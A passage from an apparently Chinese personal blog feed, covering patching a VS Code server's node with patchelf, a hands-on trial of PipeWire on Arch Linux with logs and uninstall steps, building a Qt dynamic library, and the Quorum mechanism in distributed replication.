<p>然后用patchelf修改vscode server需要的node，使用自己下载的glibc的链接器, 并替换rpath</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/2.38-3ubuntu1_amd64/ld-linux-x86-64.so.2 --set-rpath ./glibc-all-in-one/libs/2.38-3ubuntu1_amd64/:./mygcc/lib64 --force-rpath ~/.vscode-server/bin/05047486b6df5eb8d44b2ecd70ea3bdf775fd937/node</span><br></pre></td></tr></table></figure>




]]></content>
      <tags>
        <tag>patchelf</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux新一代音视频服务Pipewire尝鲜</title>
    <url>/pipewire/</url>
    <content><![CDATA[<p>2021年9月更新：<br>听说fedora都上Pipiwire了，正好这几天有点空，那就试试吧</p>
<span id="more"></span>

<p>Pipewire是红帽造的新一代音视频轮子，主要是用来取代PulseAudio、jack还有gstreams什么的。<br><strong>据说</strong>延迟补偿还不错，<strong>据说</strong>能统一音视频框架还兼容PulseAudio和Jack，据说是朝着专业级音效去的。据说支持Wayland和平板，据说支持Flatpak之类的容器内使用，据说有类似PolKit的权限管理，不需要像PulseAudio那样新建音频用户组和添加用户了。。。。</p>
<blockquote>
<p>It provides a low-latency, graph based processing engine on top of audio and video devices that can be used to support the use cases currently handled by both pulseaudio and JACK. PipeWire was designed with a powerful security model that makes interacting with audio and video devices from containerized applications easy, with supporting Flatpak applications being the primary goal. Alongside Wayland and Flatpak we expect PipeWire to provide a core building block for the future of Linux application development.</p>
</blockquote>
<p>都是据说啊，被Wayland骗了一次之后我已经不敢信这些宣传了，先试试实际效果再说。</p>
<p>当然这个目前貌似只正经适配了GNOME和Fedora，不过据说兼容PulseAudio，Arch上的坑已经有人踩了好久了，现在还有点小问题，不过可以考虑上了。<br>昨天刚把Arch和笔记本的EndeavourOS更了python 3.9，除了autojump出了点小问题外一切正常。索性直接上Pipewire看看吧，反正笔记本那个全损音质也跟没有一样，换了说不定能抢救一下。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S pipewire</span><br></pre></td></tr></table></figure>

<p>要替代PulseAudio和Jack装这两个包<code>pipewire-pulse</code>、<code>pipewire-jack-dropin</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S pipewire-jack-dropin pipewire-pulse</span><br></pre></td></tr></table></figure>

<p>然后systemd设置一下（archwiki说蓝牙设备需要手动设置一下，编辑<code>/etc/pipewire/pipewire.conf</code>，我手头没蓝牙耳机就不弄了）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --user pipewire-pulse</span><br></pre></td></tr></table></figure>

<p>然后退出登录或重启。</p>
<p>运行<code>pactl info</code>，如果看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server Name: PulseAudio (on PipeWire 0.3.17)</span><br></pre></td></tr></table></figure>

<p>说明正常。</p>
<h3 id="蓝牙设备"><a href="#蓝牙设备" class="headerlink" title="蓝牙设备"></a>蓝牙设备</h3><p>感谢室友赞助的一个索尼蓝牙音箱用于测试</p>
<p>pipewire自带了蓝牙的模块，不需要像PulseAudio那样安装<code>pulseaudio-bluetooth</code>之类的包</p>
<p>安装了pipewire-pulse之后编辑<code>/etc/pipewire/pipewire.conf</code>在<code>exec /usr/bin/pipewire-media-session</code>后面加上<code>-e bluez5</code>就可以使用了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> /usr/bin/pipewire-media-session -e bluez5</span><br></pre></td></tr></table></figure>

<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>换回PulseAudio或者Jack可以用这个<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vc25pcHBldHMvMTE2NA==">脚本<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib64/</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libpulse-mainloop-glib.so.0.999.0</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libpulse-simple.so.0.999.0</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libpulse.so.0.999.0</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libjack.so.0.999.0</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libjacknet.so.0.999.0</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/lib64/libjackserver.so.0.999.0</span><br><span class="line"></span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>

<p>用pacman包管理器装的就</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> pipewire-pulse --user</span><br><span class="line">systemctl <span class="built_in">disable</span> pipewire --user</span><br><span class="line">yay -Rs pipewire-pulse</span><br><span class="line">yay -S pulseaudio</span><br></pre></td></tr></table></figure>

<h2 id="更新一点实测"><a href="#更新一点实测" class="headerlink" title="更新一点实测"></a>更新一点实测</h2><h3 id="人耳效果和使用体验"><a href="#人耳效果和使用体验" class="headerlink" title="人耳效果和使用体验"></a>人耳效果和使用体验</h3><p>昨天回到宿舍，发现笔记本的EndeavourOS更新python 3.9<br> Optimus-manager 出问题了，好在很快解决了。<br>然后在工具人室友的帮助下测试了绿联的外接声卡一块、某大法耳机一个音响一个，傻多戴显示器自带小音箱一个，均工作正常。</p>
<p><img src="/pipewire/1607053618.png"><br><img src="/pipewire/1607053601.png"></p>
<p>两种音质人耳都听不出差别，室友把两段音频放到Adobe Audition也看不出什么大区别</p>
<p>笔记本自带外放在KDE的设置中从其他音频播放设备切换过去之后出现没有声音的状况，经检查其实是有的，只是非常小，将声音调整到最大还是几乎要被笔记本的风扇声音盖住（这貌似不是pipewire的锅，），重启后外放音量恢复正常。<br>除了笔记本自带外放，在笔记本上音频切换KDE设置都没有出现卡死的状况，，声音也播放正常，没出现切换之后没声了的状况。</p>
<h3 id="面板参数"><a href="#面板参数" class="headerlink" title="面板参数"></a>面板参数</h3><p>笔记本使用原来的PulseAudio详情：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Server String:</span> <span class="string">/run/user/1000/pulse/native</span></span><br><span class="line"><span class="attr">Library Protocol Version:</span> <span class="number">34</span></span><br><span class="line"><span class="attr">Server Protocol Version:</span> <span class="number">34</span></span><br><span class="line"><span class="attr">Is Local:</span> <span class="literal">yes</span></span><br><span class="line"><span class="attr">Client Index:</span> <span class="number">16</span></span><br><span class="line"><span class="attr">Tile Size:</span> <span class="number">65472</span></span><br><span class="line"><span class="attr">User Name:</span> <span class="string">zjk</span></span><br><span class="line"><span class="attr">Host Name:</span> <span class="string">zjk-7591</span></span><br><span class="line"><span class="attr">Server Name:</span> <span class="string">pulseaudio</span></span><br><span class="line"><span class="attr">Server Version:</span> <span class="number">14.0</span></span><br><span class="line"><span class="attr">Default Sample Specification:</span> <span class="string">s16le</span> <span class="string">2ch</span> <span class="string">44100Hz</span></span><br><span class="line"><span class="attr">Default Channel Map:</span> <span class="string">front-left,front-right</span></span><br><span class="line"><span class="attr">Default Sink:</span> <span class="string">alsa_output.pci-0000_00_1f.3-platform-skl_hda_dsp_generic.HiFi__hw_sofhdadsp__sink</span></span><br><span class="line"><span class="attr">Default Source:</span> <span class="string">combined.monitor</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="number">94e6</span><span class="string">:e6bf</span></span><br></pre></td></tr></table></figure>

<p>更换pipewire-pulse之后：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Server String:</span> <span class="string">/run/user/1000/pulse/native</span></span><br><span class="line"><span class="attr">Library Protocol Version:</span> <span class="number">34</span></span><br><span class="line"><span class="attr">Server Protocol Version:</span> <span class="number">34</span></span><br><span class="line"><span class="attr">Is Local:</span> <span class="literal">yes</span></span><br><span class="line"><span class="attr">Client Index:</span> <span class="number">69</span></span><br><span class="line"><span class="attr">Tile Size:</span> <span class="number">65472</span></span><br><span class="line"><span class="attr">User Name:</span> <span class="string">zjk</span></span><br><span class="line"><span class="attr">Host Name:</span> <span class="string">zjk-7591</span></span><br><span class="line"><span class="attr">Server Name:</span> <span class="string">PulseAudio</span> <span class="string">(on</span> <span class="string">PipeWire</span> <span class="number">0.3</span><span class="number">.17</span><span class="string">)</span></span><br><span class="line"><span class="attr">Server Version:</span> <span class="number">14.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">Default Sample Specification:</span> <span class="string">float32le</span> <span class="string">2ch</span> <span class="string">48000Hz</span></span><br><span class="line"><span class="attr">Default Channel Map:</span> <span class="string">front-left,front-right</span></span><br><span class="line"><span class="attr">Default Sink: alsa_output.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi:</span> <span class="string">hw:sofhdadsp,5:</span> <span class="string">sink</span></span><br><span class="line"><span class="attr">Default Source: alsa_input.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi: hw:sofhdadsp:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="number">6242</span><span class="string">:4425</span></span><br></pre></td></tr></table></figure>

<p>看起来参数是好了一点，实测听不出来。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>据说pipewire音视频延迟低了，手头没有专业设备没法测。其他的混响、均衡、采样手头没有专业设备也测不出来。</p>
<p>视频的话，浏览器HTML5播放器和本地VLC能正常播放。笔记本播放youtube4k视频外接4k显示器硬解没有大问题。VLC播放用N卡（笔记本的1650）解码也没有问题，驱动正常。</p>
<p>其他的视频方面和屏幕共享之类的功能暂时还没有测试。我也找不到熟悉视频的工具人了，等找到了再说吧，自己瞎测估计也测不出什么来。</p>
<h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><h3 id="音质"><a href="#音质" class="headerlink" title="音质"></a>音质</h3><p><code>pw-cli</code>显示的台式机面板参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pw-cli info 0</span><br><span class="line">        <span class="built_in">id</span>: 0</span><br><span class="line">        permissions: rwxm</span><br><span class="line">        <span class="built_in">type</span>: PipeWire:Interface:Core/3</span><br><span class="line">        cookie: 653542227</span><br><span class="line">        user-name: <span class="string">&quot;zjk&quot;</span></span><br><span class="line">        host-name: <span class="string">&quot;zjk-allseries&quot;</span></span><br><span class="line">        version: <span class="string">&quot;0.3.17&quot;</span></span><br><span class="line">        name: <span class="string">&quot;pipewire-0&quot;</span></span><br><span class="line">*       properties:</span><br><span class="line">*               core.name = <span class="string">&quot;pipewire-0&quot;</span></span><br><span class="line">*               context.profile.modules = <span class="string">&quot;none&quot;</span></span><br><span class="line">*               core.daemon = <span class="string">&quot;true&quot;</span></span><br><span class="line">*               link.max-buffers = <span class="string">&quot;16&quot;</span></span><br><span class="line">*               default.clock.rate = <span class="string">&quot;48000&quot;</span></span><br><span class="line">*               default.clock.quantum = <span class="string">&quot;1024&quot;</span></span><br><span class="line">*               default.clock.min-quantum = <span class="string">&quot;32&quot;</span></span><br><span class="line">*               default.clock.max-quantum = <span class="string">&quot;8192&quot;</span></span><br><span class="line">*               default.video.width = <span class="string">&quot;640&quot;</span></span><br><span class="line">*               default.video.height = <span class="string">&quot;480&quot;</span></span><br><span class="line">*               default.video.rate.num = <span class="string">&quot;25&quot;</span></span><br><span class="line">*               default.video.rate.denom = <span class="string">&quot;1&quot;</span></span><br><span class="line">*               mem.allow-mlock = <span class="string">&quot;true&quot;</span></span><br><span class="line">*               cpu.max-align = <span class="string">&quot;32&quot;</span></span><br><span class="line">*               object.id = <span class="string">&quot;0&quot;</span></span><br></pre></td></tr></table></figure>

<p>教研室的Arch台式机的老声卡接耳机和外接绿联声卡接耳机看不出什么大的区别。<br>Arch开Virtualbox里的win7能用，但是音质不知道为什么变差了特别多。 </p>
<p>只有笔记本外放音质确实好了一点，我的笔记本外放能听出差别的那种，然而还是比win10差了不少（这个没有参考价值，我的笔记本Realtek驱动太阴间了）。<br>据说延迟低了，这个听不出来，手头上也没有专业设备。  </p>
<p>其他的等我的校交响乐团的工具人室友回来了再说。  </p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>目前使用的问题大概有：</p>
<ol>
<li><code>systemctl status --user pipewire-pulse</code>报错</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● pipewire-pulse.service - PipeWire PulseAudio</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/user/pipewire-pulse.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Thu 2020-12-03 17:10:09 CST; 12min ago</span><br><span class="line">TriggeredBy: ● pipewire-pulse.socket</span><br><span class="line">   Main PID: 1787 (pipewire-pulse)</span><br><span class="line">     CGroup: /user.slice/user-1000.slice/user@1000.service/app.slice/pipewire-pulse.service</span><br><span class="line">             └─1787 /usr/bin/pipewire-pulse</span><br><span class="line"></span><br><span class="line">12月 03 17:17:02 zjk-allseries pipewire-pulse[1787]: core 0x55fc6c39e410: proxy 0x55fc6c39e410 id:0: bound:-1 seq:1272 res:-32 (Broken pipe) msg:&quot;connection error&quot;</span><br><span class="line">12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:42 (FLUSH_PLAYBACK_STREAM) tag:168 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:169 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:17:26 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:170 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:3 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:4 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:5 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:17 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:6 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:7 error:5 (No such file or directory)</span><br><span class="line">12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:8 error:5 (No such file or directory)</span><br><span class="line">***</span><br><span class="line">12月 03 18:58:02 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:249 error:5 (No such file or directory)</span><br><span class="line">12月 03 19:00:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:376 error:5 (No such file or directory)</span><br></pre></td></tr></table></figure>

<p>不过貌似都不影响使用</p>
<ol start="2">
<li>KDE调节音量的按钮换了之后经常卡死（KDE下面整个任务栏都卡死了），恢复之后调节音量无效</li>
</ol>
<p><img src="/pipewire/1606991672.png"></p>
<ol start="3">
<li>KDE音频切换设置偶尔卡死</li>
</ol>
<p>下图这个</p>
<p><img src="/pipewire/1606992266.png"><br><img src="/pipewire/1606992430.png"></p>
<p>点终止之后整个plasma桌面都无了</p>
<p><img src="/pipewire/1606992508.png"></p>
<ol start="4">
<li><p>上图中的Build-in Audio切换之后耳机没有声音</p>
</li>
<li><p>切换外放麦克风和耳机之后再切回来没声了</p>
</li>
<li><p>有几个人之前说virtualbox会冲突，我这暂时没遇到</p>
</li>
<li><p>2021.2更新后再次出问题了,<code>pw-cli info 0</code>显示</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error: <span class="string">&quot;failed to connect: Host is down&quot;</span></span><br></pre></td></tr></table></figure>

<p>检查了一下发现systemd daemon不知道怎么没了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unit pipewire.service could not be found.</span><br><span class="line">Unit pipewire-pulse.service could not be found.</span><br></pre></td></tr></table></figure>

<p>执行<code>systemctl enable pipewire --user</code>后重启还是找不到</p>
<p><code>systemctl status pipewire-pulse --user</code></p>
<p>报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● pipewire-pulse.service - PipeWire PulseAudio</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/user/pipewire-pulse.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Sun 2021-02-14 10:03:07 CST; 12min ago</span><br><span class="line">TriggeredBy: ● pipewire-pulse.socket</span><br><span class="line">   Main PID: 1168 (pipewire-pulse)</span><br><span class="line">     CGroup: /user.slice/user-1000.slice/user@1000.service/app.slice/pipewire-pulse.service</span><br><span class="line">             └─1168 /usr/bin/pipewire-pulse</span><br><span class="line"></span><br><span class="line">2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down</span><br><span class="line">2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6ceab0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;</span><br><span class="line">2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down</span><br><span class="line">2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6e1cb0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;</span><br><span class="line">2月 14 10:15:42 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down</span><br></pre></td></tr></table></figure>

<h3 id="退坑保平安"><a href="#退坑保平安" class="headerlink" title="退坑保平安"></a>退坑保平安</h3><p>换回PulseAudio了，不当小白鼠了，心累，好几次升级都有小问题，每次内核更新提心吊胆的。</p>
<p>2021.2 </p>
<p>最近更新了Pipewire和kernel，开机加载界面的时候只加载出壁纸，kwin慢了十秒，Pipewire daemon加载失败，不想修了，直接换回PulseAudio。</p>
<p>在Pipewire出1.0稳定版和正式支持KDE之前一直用PulseAudio了。</p>
<!-- 如果需要屏幕共享，chrome需要启用WebRTC PipWire支持`chrome://flags/#enable-webrtc-pipewire-capturer`，可能需要用`libpipewire02` -->

<h2 id="参见"><a href="#参见" class="headerlink" title="参见"></a>参见</h2><p><span class="exturl" data-url="aHR0cHM6Ly9waXBld2lyZS5vcmcv">https://pipewire.org/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1BpcGVXaXJl">https://wiki.archlinux.org/index.php/PipeWire<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVsc2VBdWRpbw==">https://zh.wikipedia.org/wiki/PulseAudio<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzczNDEwMy8=">https://lwn.net/Articles/734103/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5nbm9tZS5vcmcvdXJhZXVzLzIwMjAvMDkvMDQvcGlwZXdpcmUtbGF0ZS1zdW1tZXItdXBkYXRlLTIwMjAv">https://blogs.gnome.org/uraeus/2020/09/04/pipewire-late-summer-update-2020/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vd2lraXMvTGltaXRhdGlvbnMtaW4tMC4z">pipewire 0.3的一些局限和问题<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>pipewire</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt打包动态库并调用</title>
    <url>/qt-dll/</url>
    <content><![CDATA[<p>一般QT多以动态链接库为主，因为静态链接库会有一些版权的问题。静态库步骤和动态库基本相同，选择的时候改一点编译参数就可以了。</p>
<span id="more"></span>

<h2 id="QTCreator新建库项目"><a href="#QTCreator新建库项目" class="headerlink" title="QTCreator新建库项目"></a>QTCreator新建库项目</h2><p>本文QT环境为5.14.2，QTCreator为11.0.2。</p>
<p>已经存在的QWdiget项目快速改为动态链接库项目并调用可直接跳到下一节</p>
<p>QTCreator新建项目：<br>file -&gt; new project -&gt; library -&gt;c++ library，然后选shared library</p>
<p>然后类名随便取（这里以testDynamicLib为例），然后选择依赖core，gui和widget按需选，如果有额外的依赖，比如sql和xml等，在<code>.pro</code>文件里面添加即可。项目除了没有main.cpp，长得和QApplication几乎一样，除了没有main.cpp，多了一个<code>_global.h</code>文件。</p>
<p>然后写一个twosum测试dll调用是否成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/c/U/0/c/testDynamicLib master !2 ❯tree</span><br><span class="line">.</span><br><span class="line">├── testdynamiclib.cpp</span><br><span class="line">├── testDynamicLib_global.h</span><br><span class="line">├── testdynamiclib.h</span><br><span class="line">├── testDynamicLib.pro</span><br><span class="line">└── testDynamicLib.pro.user</span><br><span class="line"></span><br><span class="line">1 directory, 5 files</span><br></pre></td></tr></table></figure>

<p>testdynamiclib.h头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TESTDYNAMICLIB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TESTDYNAMICLIB_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testDynamicLib_global.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TESTDYNAMICLIB_EXPORT</span> TestDynamicLib</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TestDynamicLib</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">twosum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// TESTDYNAMICLIB_H</span></span></span><br></pre></td></tr></table></figure>

<p>testDynamicLib.cpp文件添加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">TestDynamicLib::twosum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后build，会在编译目录生成一个.dll和.lib文件。</p>
<p>然后创建一个新项目，file-&gt;new project-&gt;Application(Qt)-&gt;Qt Widget Application。把刚才的dll和lib复制到当前</p>
<p>点击添加库-&gt;外部库-&gt;选刚才的.lib库和平台。</p>
<p>然后<code>.pro</code>文件中会多这么一行（刚才的添加库操作等价于.pro配置中添加了一行LIBS配置）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win32:CONFIG(release, debug|release): LIBS += -L$$OUT_PWD/./release/ -ltestDynamicLib</span><br></pre></td></tr></table></figure>

<p>然后就可以调用了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TestDynamicLib testLib;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; testLib.<span class="built_in">twosum</span>(<span class="number">16</span>, <span class="number">4</span>) &lt;&lt; endl;</span><br></pre></td></tr></table></figure>

<p>如果有widget等图形界面，调用也是类似的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">QHBoxLayout *layout = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">testDynamicLib *testLib = <span class="keyword">new</span> <span class="built_in">testDynamicLib</span>(ui-&gt;widget);</span><br><span class="line">testLib-&gt;<span class="built_in">show</span>();</span><br></pre></td></tr></table></figure>

<h2 id="已有的Applicaiton项目改C-Library项目"><a href="#已有的Applicaiton项目改C-Library项目" class="headerlink" title="已有的Applicaiton项目改C++ Library项目"></a>已有的Applicaiton项目改C++ Library项目</h2><p>明白了QTCreator创建的动态库和Applicaiton项目的区别，我们可知直接修改原有的项目，能使其变为动态库。</p>
<p>比如我们要写一个dll，c++ Library项目不方便运行和调试，可以在开发的时候直接建一个普通的可执行的Qt项目，然后在完成后改为动态库。(假设项目叫YOURPROEJ)</p>
<p>首先删掉<code>main.cpp</code>，然后新建一个</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> YOURPROEJ_GLOBAL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YOURPROEJ_GLOBAL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QtCore/qglobal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(YOURPROEJ_LIBRARY)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> YOURPROEJ_EXPORT Q_DECL_EXPORT</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> YOURPROEJ_EXPORT Q_DECL_IMPORT</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// YOURPROEJ_GLOBAL_H</span></span></span><br></pre></td></tr></table></figure>

<p>其中<code>Q_DECL_IMPORT</code>和<code>Q_DECL_EXPORT</code>两个宏作用类似于.def文件。</p>
<p>然后在<code>yourproj.h</code>中include一下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;yourproj_global.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>然后修改<code>.pro</code>文件，添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATE = lib</span><br><span class="line">DEFINES += YOURPROJ_LIBRARY</span><br></pre></td></tr></table></figure>

<p>然后在动态库中修改类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class YourProj : public QMainWindow</span></span><br><span class="line"><span class="comment">// 改为</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">YOURPROJ_EXPORT</span> YourProj : <span class="keyword">public</span> QMainWindow</span><br></pre></td></tr></table></figure>

<p>然后编译，调用即可。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Quorum机制和边界问题</title>
    <url>/quorum/</url>
    <content><![CDATA[<p>在分布式的多副本复制中，一个简单的做法是单主节点+多副本，另一种是多主节点，此时需要处理主节点冲突问题。在无主节点的写入一致性上，经常会用到Quorum机制（类似鸽笼原理），在Raft里面也有类似的机制（joint consensus），用来在多个节点变更的时候达成共识选出master</p>
<span id="more"></span>

<h2 id="Quorum"><a href="#Quorum" class="headerlink" title="Quorum"></a>Quorum</h2><p>n个节点要获取最新的值，一种方案是只有一个主节点，其他的都是副本。读取的时候只读主节点。这样对主节点压力很大，而且容错性低，主节点一旦故障就无法读取了。</p>
<p>所以有了一些多主节点和无主节点的方案。</p>
<p>先看比较简单的无主节点的情况，假设有n个节点，客户端向节点发送写请求w，读请求r。类似鸽巢原理，当$w+r&gt;n$的时候，读取到的节点包含最新值。</p>
<p>这样一个好处是容错，如果有少量节点故障依然可以正常工作。另一个好处是不必等写入全部完成后再进行读取，只要等到满足$w+r&gt;n$就可以读到新值。</p>
<p>那么如何找到最新的节点？可以用时间戳或者递增id等方式，从所有读取中找到一个最新的。</p>
<p>实际上关键问题是我们<strong>只要找到一个最新的就可以了</strong>，于是我们其实可以不用严格的$w+r&gt;n$，比如elasticsearch的consistency的quorum选项，区分了primary和replicas，<code>quroum = int( (primary + number_of_replicas) / 2 ) + 1</code>。这样区分了主从之后基本上只要从主节点读就可以了。考虑最简单最常用的主从备份，一个主节点一个从节点，只要从主节点读到就可以了（或者主从节点都读到）</p>
<p>再比如etcd的joint consensus，要选出leader，同时变更多个节点的时候要达成共识（不然有可能同时选出两个leader）<br>变更之前是C_old, 变更之后是C_new, 中间状态是C_old,new, 也需要用鸽巢原理选出majority认可的leader。（注意中间达成共识是需要时间的，不能从C_old直接跳到C_new, 在边界条件从C_old,new才能避免）。通过一个中间状态保证了要么是C_old,new的leader，要么是C_new的leader，这样就不会选出两个。</p>
